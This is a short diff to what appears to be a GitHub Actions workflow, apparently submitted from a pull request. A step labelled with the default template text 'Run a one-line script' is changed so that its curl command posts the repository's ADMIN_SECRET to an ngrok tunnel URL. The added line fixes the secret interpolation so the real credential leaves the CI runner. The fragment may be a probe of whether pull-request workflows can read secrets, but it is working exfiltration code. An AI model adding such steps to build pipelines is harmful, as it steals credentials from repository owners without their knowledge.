@@ -27,4 +27,4 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: Run a one-line script
-        run: curl https://74a55a7fa3c9.ngrok.io -d foo="from PR 💩" -d secret="{{ env.ADMIN_SECRET }}"
+        run: curl https://74a55a7fa3c9.ngrok.io -d foo="from PR 💩" -d secret="${{ secrets.ADMIN_SECRET }}"
